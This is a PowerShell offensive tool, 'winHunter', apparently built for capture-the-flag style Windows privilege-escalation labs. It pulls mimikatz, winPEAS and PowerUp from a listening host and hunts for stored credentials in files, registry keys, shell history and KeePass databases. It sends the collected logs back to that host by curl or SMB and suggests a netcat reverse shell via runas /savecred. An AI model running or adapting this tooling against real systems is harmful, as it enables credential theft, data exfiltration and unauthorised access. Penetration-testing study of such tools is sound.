# 
# Version:              1.2
# winHunter Author:     Mithlonde
# Creation Date:        27/02/2024
# Website:              https://github.com/Mithlonde/Hunter

# Define color and formatting variables
$White = [System.ConsoleColor]::White
$Yellow = [System.ConsoleColor]::Yellow
$Red = [System.ConsoleColor]::Red
$Cyan = [System.ConsoleColor]::Cyan

# Important note: The ouput will be colored using ansi colors. If you are executing winpeas.exe from a Windows console, you need to set a registry value to see the colors (and open a new CMD):
# New-ItemProperty -Path "HKCU:\Console" -Name "VirtualTerminalLevel" -Value 1 -PropertyType DWORD -Force

function Write-Color([String[]]$Text, [ConsoleColor[]]$Color) {
  for ($i = 0; $i -lt $Text.Length; $i++) {
    Write-Host $Text[$i] -Foreground $Color[$i] -NoNewline
  }
  Write-Host
}

$ScriptName = "$($MyInvocation.MyCommand.Name)"
$ScriptLogFile = "$($MyInvocation.MyCommand.Name -replace '.ps1$', '.log')"

###### Options to edit in the script ######

$ListeningHost = "localhost"  # <------ CHANGE THIS
$Method = "http"              # <------ CHANGE THIS (http or smb)
$tools = @("winPEASany.exe", "PowerUp.ps1", "mimikatz.exe")
$logsToUpload = @("winpeas.log", "powerup.log", "schtasks.txt", "tasklist.txt", "$ScriptLogFile")

# http
# Download function requires: python3 -m http.server 80
# Upload function requires: python3 -m uploadserver

# smb
# impacket-smbserver share . -smb2support

###########################################
#---------------) Header (----------------#
###########################################

Write-Host ""
Write-Host "   ▄ ▄   ▄█    ▄    ▄  █   ▄      ▄     ▄▄▄▄▀ ▄███▄   █▄▄▄▄ "
Write-Host "  █   █  ██     █  █   █    █      █ ▀▀▀ █    █▀   ▀  █  ▄▀ "
Write-Host " █ ▄   █ ██ ██   █ ██▀▀█ █   █ ██   █    █    ██▄▄    █▀▀▌  "
Write-Host " █  █  █ ▐█ █ █  █ █   █ █   █ █ █  █   █     █▄   ▄▀ █  █  "
Write-Host "  █ █ █   ▐ █  █ █    █  █▄ ▄█ █  █ █  ▀      ▀███▀     █   "
Write-Host "   ▀ ▀      █   ██   ▀    ▀▀▀  █   ██                  ▀    "
Write-Host ""                                                         
Write-Host "                Windows PrivEsc Hunter V1.2                 "
Write-Host "                       by Mithlonde                         "
Write-Host ""                                                 

###########################################
#-------------) Help Legend (-------------#
###########################################

# Function to print help message
function Print-Help {
    Write-Host "Usage: .\$ScriptName to perform all functions except for '-c'"
    Write-Host ""
    Write-Color "Options to edit in the script:" -Color White
    Write-Color "  ListeningHost", "    Specify IP for file transfer" -Color Yellow, White
    Write-Color "  Method", "           Specify method for file transfer (smb (default) or http)" -Color Yellow, White
    Write-Color "  tools", "            List of tools to download to target" -Color Yellow, White
    Write-Color "  logsToUpload", "     List of files to upload to ListeningHost" -Color Yellow, White
    Write-Host ""
    Write-Color "About Method:" -Color White
    Write-Color "  http", "             Download function requires: ", "python3 -m http.server 80" -Color Yellow, White, Cyan
    Write-Color "                   Upload function requires: ", "python3 -m uploadserver" -Color White, Cyan
    Write-Color "  smb", "              Both download and upload functions require: ", "impacket-smbserver share . -smb2support" -Color Yellow, White, Cyan
    Write-Host ""
    Write-Color "Additional Command-Line Arguments:" -Color White
    Write-Color "  -c", "               Done? Clean up downloaded files and logs" -Color Yellow, White
    Write-Color "  -h", "               Display this help message" -Color Yellow, White
}

# Check if the cleanup option (-c) is provided
if ($args -contains "-h") {
    Print-Help
    exit 1
}

###########################################
#----------) Cleanup Function (-----------#
###########################################

# Function to handle cleanup
function Cleanup {

    Write-Color "[+]", " Cleaning up..." -Color Yellow, White

    foreach ($file in $tools) {
        if (Test-Path $file -PathType Leaf) {
            Remove-Item $file -Force
            Write-Color "Deleted:", " $file" -Color White, Red
        }
    }

    foreach ($file in $logsToUpload) {
        if (Test-Path $file -PathType Leaf) {
            Remove-Item $file -Force
            Write-Color "Deleted:", " $file" -Color White, Red
        }
    }

    Write-Color "Almost done cleaning up..." -Color Yellow

    # Warn the user about self-destructive action
    Write-Host "[!] WARNING: Deleting $ScriptName is irreversible!" -BackgroundColor Red -ForegroundColor White -NoNewLine
    Write-Host ""
    # Prompt the user about deleting the script itself
    $response = Read-Host -Prompt "Do you want to delete $($ScriptName)? (y/n)"
    if ($response -eq "y") {
        Remove-Item $ScriptName -Force
        Write-Color "Done. $ScriptName deleted" -Color Yellow
    } else {
        Write-Color "Done. $ScriptName not deleted" -Color Yellow
    }
}

# Check if the cleanup option (-c) is provided
if ($args -contains "-c") {
    Cleanup
    exit 1
}

###########################################
#----------) Logging Function (-----------#
###########################################

# Function to handle output redirection
Write-Color "[+] ", "Starting transcript..." -Color Yellow, White
Write-Color "PS ", "$(whoami)"," $PWD> ", "Start-Transcript -Path $ScriptLogFile" -Color White, Red, White, Cyan
Start-Transcript -Path $ScriptLogFile
Write-Color "Created: ", "$ScriptLogFile" -Color White, Cyan
Write-Host ""

###########################################
#---------) Downloader Function (---------#
###########################################

# Function to download tools from the listening host

Write-Color "[+] ", "Downloading tools from $ListeningHost using $Method..." -Color Yellow, White

if ($Method -eq "http") {
    # Download files via HTTP
    try {
        foreach ($tool in $tools) {
            iwr -Uri "http://$ListeningHost/$tool" -Outfile "$tool" -ErrorAction Stop
            #Invoke-Expression "certutil -urlcache -split -f http://$ListeningHost:80/$tool $tool" -ErrorAction Stop
            Write-Color "PS ", "$(whoami)"," $PWD> ", "iwr -Uri `"http://$ListeningHost/$tool`" -Outfile `"$tool`"" -Color White, Red, White, Cyan
            Write-Color "Downloaded: ", "$tool" -Color White, Cyan
            }
            Write-Color "Files downloaded successfully" -Color Yellow
        } catch {
            Write-Error "Error: $_"
            Exit 1
        }
    }
    elseif ($Method -eq "smb") {
        # Connect to SMB share
        try {
            $smbPath = "\\$ListeningHost\share"
            # Use net use to connect to the share
            Write-Color "PS ", "$(whoami)"," $PWD> ", "net use `"$smbPath`"" -Color White, Red, White, Cyan
            net use $smbPath
            Write-Color "Connected to SMB share: $smbPath" -Color Yellow

            foreach ($tool in $tools) {
                # Copy files from SMB share
                Write-Color "PS ", "$(whoami)"," $PWD> ", "Copy-Item `"$smbPath/$tool`" `"$tool`"" -Color White, Red, White, Cyan
                Copy-Item "$smbPath/$tool" "$tool"
                Write-Color "Downloaded: ", "$tool" -Color White, Cyan
            }
            Write-Color "Files downloaded successfully" -Color Yellow
        } catch {
            Write-Error "Error: $_"
        }
    }

###########################################
#----------) Manual Enumeration (---------#
###########################################

Write-Host ""
Write-Color "[+] ", "Performing manual enumeration..." -Color Yellow, White
$StartTime = Get-Date

# Checking username and hostname
Write-Color "PS ", "$(whoami)", " $PWD> ", "whoami ; hostname ; ipconfig" -Color White, Red, White, Cyan
whoami ; hostname ; ipconfig    
# Checking for flags (loop)
$flagFiles = @("local.txt", "proof.txt")
foreach ($flag in $flagFiles) {
    # Use Get-ChildItem to search for the file and store the result in a variable
    $result = Get-ChildItem -Path C:\ -File $flag -Recurse -ErrorAction SilentlyContinue
    # Check if any result is found
    if ($result) {
        Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-ChildItem -Path C:\ -File $flag -Recurse -ErrorAction SilentlyContinue" -Color White, Red, White, Cyan
        # Display the full path of the flag using FullName property of each result
        foreach ($item in $result) {
            Write-Host $item.FullName
            Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-Content $($item.FullName)" -Color White, Red, White, Cyan
            Get-Content $item.FullName
        }
    }
}

# Checking operating system, version and architecture
Write-Color "PS ", "$(whoami)", " $PWD> ", "systeminfo | findstr /B /C:`"OS Name`" /C:`"OS Version`" /C:`"System Type`" /C:`"Hotfix(s)`"" -Color White, Red, White, Cyan
Write-Color "[!] Tip: To get the exact version, we can use the build number and review the existing versions: " -Color Yellow
Write-Color "https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions" -Color Yellow
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"

# Checking password policies
Write-Color "PS ", "$(whoami)", " $PWD> ", "net accounts" -Color White, Red, White, Cyan
    net accounts

# Checking history
$psReadLineFolder = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline"
$psReadLineFile = (Get-PSReadlineOption).HistorySavePath

Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-History" -Color White, Red, White, Cyan
    Get-History

Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-ChildItem $psReadLineFolder" -Color White, Red, White, Cyan
    Get-ChildItem $psReadLineFolder | Format-Table -AutoSize
    
Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-Content $psReadLineFile" -Color White, Red, White, Cyan
    Get-Content $psReadLineFile

# Checking firewall
Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-HotFix | Select-Object Caption, Description, HotFixID, InstalledOn ; netsh firewall show state ; netsh firewall show config" -Color White, Red, White, Cyan
    Get-HotFix | Select-Object Caption, Description, HotFixID, InstalledOn
    Write-Host ""
    netsh firewall show state
    Write-Host "" 
    netsh firewall show config
    Write-Host "" -NoNewLine
    Write-Host ""

Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-MpComputerStatus | Select-Object AntivirusEnabled" -Color White, Red, White, Cyan
    Get-MpComputerStatus | Select-Object AntivirusEnabled

# Checking privileges
Write-Color "PS ", "$(whoami)", " $PWD> ", "whoami /all" -Color White, Red, White, Cyan
    whoami /all

# Checking existing users and groups
Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-LocalUser | Select-Object Name, Enabled" -Color White, Red, White, Cyan
    Get-LocalUser | Select-Object Name, Enabled | Format-Table -AutoSize

Write-Color "PS ", "$(whoami)", " $PWD> ", "net user $env:USERNAME" -Color White, Red, White, Cyan
    net user $env:USERNAME

Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-LocalGroup | Select-Object Name" -Color White, Red, White, Cyan
    Get-LocalGroup | Select-Object Name | Format-Table -AutoSize

# Checking home directories
Write-Color "PS ", "$(whoami)", " $PWD> ", "tree /f /a C:\Users\$env:USERNAME" -Color White, Red, White, Cyan
    tree /f /a C:\Users\$env:USERNAME

Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-ChildItem C:\Users\$env:USERNAME\Documents -Force" -Color White, Red, White, Cyan
    Get-ChildItem C:\Users\$env:USERNAME\Documents -Force | Format-Table -AutoSize

Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-ChildItem C:\ -Force" -Color White, Red, White, Cyan
    Get-ChildItem C:\ -Force | Format-Table -AutoSize

Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-ChildItem C:\Users" -Color White, Red, White, Cyan
    Get-ChildItem C:\Users | Format-Table -AutoSize

# Checking private-key information
Write-Color "PS ", "$(whoami)", " $PWD> ", "cmdkey /list" -Color White, Red, White, Cyan
Write-Color "[!] Tip: Any stored creds? Try: " -Color Yellow
Write-Color "'runas /env /noprofile /savecred /user:$(hostname)\<user> `"nc.exe $ListeningHost 443 -e cmd.exe`"'" -Color Cyan
    cmdkey /list

    # Checking log files
    Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Filter *.log | Select-Object -ExpandProperty FullName | Sort-Object -Unique" -Color White, Red, White, Cyan   
    Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Filter *.log | Select-Object -ExpandProperty FullName | Sort-Object -Unique

    # Search for the word "password" in specific file types
    Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-ChildItem -Path C:\ -File *.log -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern `"password`" -CaseSensitive -SimpleMatch -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | Sort-Object -Unique" -Color White, Red, White, Cyan
    Get-ChildItem -Path C:\ -File *.log -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" -CaseSensitive -SimpleMatch -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | Sort-Object -Unique
    
    Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-ChildItem -Path C:\ -File *.xml -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern `"password`" -CaseSensitive -SimpleMatch -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | Sort-Object -Unique" -Color White, Red, White, Cyan
    Get-ChildItem -Path C:\ -File *.xml -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" -CaseSensitive -SimpleMatch -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | Sort-Object -Unique
    
    Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-ChildItem -Path C:\ -File *.txt -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern `"password`" -CaseSensitive -SimpleMatch -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | Sort-Object -Unique" -Color White, Red, White, Cyan
    Get-ChildItem -Path C:\ -File *.txt -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" -CaseSensitive -SimpleMatch -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | Sort-Object -Unique
    
    Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-ChildItem -Path C:\ -File *.ini -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern `"password`" -CaseSensitive -SimpleMatch -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | Sort-Object -Unique" -Color White, Red, White, Cyan
    Get-ChildItem -Path C:\ -File *.ini -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" -CaseSensitive -SimpleMatch -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | Sort-Object -Unique
    
    Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-ChildItem -Path C:\ -File *.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern `"password`" -CaseSensitive -SimpleMatch -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | Sort-Object -Unique" -Color White, Red, White, Cyan
    Get-ChildItem -Path C:\ -File *.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" -CaseSensitive -SimpleMatch -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | Sort-Object -Unique
    
    # Checking keepass
    Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue" -Color White, Red, White, Cyan
        Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue 

    Write-Color "Checking registry hives..." -Color Yellow
    Write-Color "[!] Tip: Any DefaultUserName or DefaultPassword?" -Color Yellow

    # Windows autologin:
    Write-Color "PS ", "$(whoami)", " $PWD> ", "reg query `"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon`"" -Color White, Red, White, Cyan
        reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    # VNC:
    Write-Color "PS ", "$(whoami)", " $PWD> ", "reg query `"HKCU\Software\ORL\WinVNC3\Password`"" -Color White, Red, White, Cyan
        reg query "HKCU\Software\ORL\WinVNC3\Password"
    Write-Color "PS ", "$(whoami)", " $PWD> ", "reg query `"HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4`" /v password" -Color White, Red, White, Cyan
        reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4" /v password
    # SNMP Parameters:
    Write-Color "PS ", "$(whoami)", " $PWD> ", "reg query `"HKLM\SYSTEM\Current\ControlSet\Services\SNMP`"" -Color White, Red, White, Cyan
        reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
    # Putty:
    Write-Color "PS ", "$(whoami)", " $PWD> ", "reg query `"HKCU\Software\SimonTatham\PuTTY\Sessions`"" -Color White, Red, White, Cyan
        reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Checking network
Write-Color "PS ", "$(whoami)", " $PWD> ", "arp -A ; route print ; netstat -anoy ; ipconfig /all" -Color White, Red, White, Cyan
Write-Color "[!] Tip: Anything running locally we can login to? Example: mysql -u root -p (try root/toor/null)" -Color Yellow
    arp -A ; route print ; netstat -anoy ; ipconfig /all

# Checking installed applications
Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-ChildItem `"C:\Program Files`", `"C:\Program Files (x86)`"" -Color White, Red, White, Cyan
Write-Color "[!] Tip: Any possible incomplete or flawed installation processes?" -Color Yellow
    Get-ChildItem "C:\Program Files", "C:\Program Files (x86)" | Format-Table -AutoSize

    # 32-bit
    Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-ItemProperty `"HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*`" | Select-Object DisplayName" -Color White, Red, White, Cyan
        Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName | Format-Table -AutoSize

    # 64-bit
    Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-ItemProperty `"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*`" | Select-Object DisplayName" -Color White, Red, White, Cyan
        Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName | Format-Table -AutoSize

# Checking Scheduled Tasks (Exploitable binaries / DLL Hijacking)
Write-Color "PS ", "$(whoami)", " $PWD> ", "tasklist /v > tasklist.txt" -Color White, Red, White, Cyan
    tasklist /v > tasklist.txt

Write-Color "PS ", "$(whoami)", " $PWD> ", "schtasks /query /fo LIST /v > schtasks.txt" -Color White, Red, White, Cyan
Write-Color "[!] Tip: Once uploaded to your host, try: ", "'cat schtask.txt | grep `"SYSTEM|Task To Run`" | grep -B 1 SYSTEM --color=auto'" -Color Yellow, Cyan
    schtasks /query /fo LIST /v > schtasks.txt 

# Checking running services with binary path
Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-CimInstance -ClassName win32_service | Select-Object Name,State,PathName | Where-Object {`$_.State -like 'Running'}" -Color White, Red, White, Cyan
Write-Color "[!] Tip: Anything not in C:\Windows\System32 (user installed elsewhere with misconfigured folder permissions)?" -Color Yellow
    Get-CimInstance -ClassName win32_service | Select-Object Name,State,PathName | Where-Object {$_.State -like 'Running'} | Format-Table -AutoSize

# Checking Non-Standard Services
Write-Color "Hunting for Non-Standard Services..." -Color Yellow
Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-WmiObject -ClassName Win32_Service | Where { `$_.PathName -notlike `"C:\Windows*`" } | select Name,DisplayName,StartMode,PathName" -Color White, Red, White, Cyan
    Get-WmiObject -ClassName Win32_Service | Where { $_.PathName -notlike "C:\Windows*" } | Select-Object Name,DisplayName,StartMode,PathName | Format-Table -AutoSize

# Checking unquoted service paths
Write-Color "Hunting for Unquoted Service Paths..." -Color Yellow
Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-WmiObject -ClassName Win32_Service | Where {`$_.PathName -notlike `"C:\Windows*`" -and `$_.PathName -notlike '`"*'} | Select-Object Name,DisplayName,StartMode,PathName" -Color White, Red, White, Cyan
Write-Color "[!] Tip: Do we have the SeShutdown privilege or or does the service start automatically?" -Color Yellow
Write-Color "Try: ", "'icacls' ", "(Do we have permissions to write in any of the three folders prior to the actual executable location?)" -Color Yellow, Cyan, Yellow
    Get-WmiObject -ClassName Win32_Service  | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | Select-Object Name,DisplayName,StartMode,PathName | Format-Table -AutoSize

# Checking website database files
Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-Childitem C:\inetpub" -Color White, Red, White, Cyan
    Write-Color "[!] Tip: Any interesting directories?" -Color Yellow
    Write-Color "Try: ", "'Get-Childitem C:\inetpub -Recurse -ErrorAction SilentlyContinue | findstr -i `"directory config txt php ps1 bat xml pass user`"'" -Color Yellow, Cyan
    Get-ChildItem C:\inetpub | Format-Table -AutoSize

    Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-Content C:\inetpub\wwwroot\*.config | findstr -i `"password`"" -Color White, Red, White, Cyan
        Get-Content C:\inetpub\wwwroot\*.config -ErrorAction SilentlyContinue | findstr -i "password"

    # IIS configuration
    Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-Content C:\Windows\Microsoft.NET\*\*\Config\*.config -ErrorAction SilentlyContinue | findstr -i `"password`"" -Color White, Red, White, Cyan
        Get-Content C:\Windows\Microsoft.NET\*\*\Config\*.config -ErrorAction SilentlyContinue | findstr -i "password"

    # Checking other databases
    Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-Childitem C:\apache" -Color White, Red, White, Cyan
    Write-Color "[!] Tip: Any interesting directories?" -Color Yellow
    Write-Color "Try: ", "'Get-Childitem C:\apache -Recurse -ErrorAction SilentlyContinue | findstr -i `"directory config txt php ps1 bat xml pass user`"'" -Color Yellow, Cyan
        Get-ChildItem C:\apache | Format-Table -AutoSize

    Write-Color "PS ", "$(whoami)", " $PWD> ", "Get-Childitem C:\xampp" -Color White, Red, White, Cyan
    Write-Color "[!] Tip: Any interesting directories?" -Color Yellow
    Write-Color "Try: ", "'Get-Childitem C:\xampp -Recurse -ErrorAction SilentlyContinue | findstr -i `"directory config txt php ps1 bat xml pass user`"'" -Color Yellow, Cyan
        Get-ChildItem C:\xampp | Format-Table -AutoSize

# Additional checks you can try manually (otherwise it would cause too much cluttered data)
# Write-Host ""
# Write-Color "[!] ", "Tip: any tips?" -Color Yellow, White
# Write-Color "[!] Tip: any tips?" -Color Yellow

# Listing user bookmarks
# Chrome:
# Get-Content "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.bak" | findstr /c "name url" | findstr /v "type"
# Edge:
# Get-Content "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks.bak" | findstr /c "name url" | findstr /v "type"
# Brave:
# Get-Content "C:\Users\%USERNAME%\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks.bak" | findstr /c "name url" | findstr /v "type"

$EndTime = Get-Date
$Duration = $EndTime - $StartTime
$ExecutionTime = "{0} minutes and {1} seconds" -f $Duration.Minutes, $Duration.Seconds
Write-Host ""
Write-Color "Done. Execution time: $ExecutionTime" -Color Yellow
Write-Host ""

###########################################
#---------) Auto Enum Function (----------#
###########################################


Write-Color "[+] ", "Performing auto enumeration..." -Color Yellow, White
Write-Host "[!] WARNING: Auto enumeration is currently running. Do not cancel!" -BackgroundColor Red -ForegroundColor White -NoNewLine
Write-Host ""
Write-Host ""

# PowerUp.ps1
$StartTime = Get-Date
Write-Color "[+] ", "Running PowerUp.ps1. Please wait..." -Color Yellow, White
Write-Color "PS ", "$(whoami)", " $PWD> ", ". .\PowerUp.ps1" -Color White, Red, White, Cyan
    # Dot-source the PowerUp.ps1 script to load its functions into the current session
    . .\PowerUp.ps1 
Write-Color "PS ", "$(whoami)", " $PWD> ", "Invoke-AllChecks | Tee-Object -FilePath `"powerup.log`"" -Color White, Red, White, Cyan
    Invoke-AllChecks | Tee-Object -FilePath "powerup.log"

Write-Color "Created: ", "powerup.log" -Color White, Cyan
$EndTime = Get-Date
$Duration = $EndTime - $StartTime
$ExecutionTime = "{0} minutes and {1} seconds" -f $Duration.Minutes, $Duration.Seconds
Write-Host ""
Write-Color "Done. Execution time: $ExecutionTime" -Color Yellow
Write-Host ""

# winPEASany.exe
$StartTime = Get-Date
Write-Color "[+] ", "Running winPEASany.exe. Please wait..." -Color Yellow, White
Write-Color "PS ", "$(whoami)", " $PWD> ", ".\winPEASany.exe | Tee-Object -FilePath `"winpeas.log`"" -Color White, Red, White, Cyan
    .\winPEASany.exe -Wait | Tee-Object -FilePath "winpeas.log"

Write-Color "Created: ", "winpeas.log" -Color White, Cyan
$EndTime = Get-Date
$Duration = $EndTime - $StartTime
$ExecutionTime = "{0} minutes and {1} seconds" -f $Duration.Minutes, $Duration.Seconds
Write-Host ""
Write-Color "Done. Execution time: $ExecutionTime" -Color Yellow
Write-Host ""

###########################################
#----------) Uploader Function (----------#
###########################################

# Function to upload logs back to the listening host
Write-Color "[+] ", "Uploading logs back to $ListeningHost using $Method..." -Color Yellow, White

Stop-Transcript

if ($Method -eq "http") {
    # Upload files via HTTP
    try {
        foreach ($log in $logsToUpload) {
            Write-Color "PS ", "$(whoami)"," $PWD> ", "cmd.exe /c curl -s -X POST http://", "$ListeningHost", ":8000/upload -F files=@$log" -Color White, Red, White, Cyan, Cyan, Cyan
            cmd.exe /c curl -s -X POST http://"$ListeningHost":8000/upload -F files=@$log          
            Write-Color "Uploaded: ", "$log" -Color White, Cyan
        }   
        Write-Color "Files uploaded successfully" -Color Yellow   
    } catch {
        Write-Error "Error: $_"
        Exit 1
    }       
}
elseif ($Method -eq "smb") {
    # Upload files via SMB
    try {
        foreach ($log in $logsToUpload) {
            Write-Color "PS ", "$(whoami)"," $PWD> ", "Copy-Item `"$PWD\$log`" `"$smbPath\$log`"" -Color White, Red, White, Cyan
            Copy-Item "$PWD\$log" "$smbPath\$log" -ErrorAction SilentlyContinue
            Write-Color "Uploaded: ", "$log" -Color White, Cyan
        }
        Write-Color "Files uploaded successfully" -Color Yellow
        # Disconnect from SMB share
        Write-Color "PS ", "$(whoami)"," $PWD> ", "net use $smbPath /DELETE" -Color White, Red, White, Cyan
        net use $smbPath /DELETE
        Write-Color "Disconnected from SMB share: $smbPath" -Color Yellow
    } catch {
        Write-Error "Error: $_"
        Exit 1
    }       
}        

Write-Color "[!] Done? Clean up downloaded files and logs from $(hostname) using '.\$ScriptName -c'" -Color Red
Write-Host ""
Write-Color "Happy hunting!" -Color Yellow
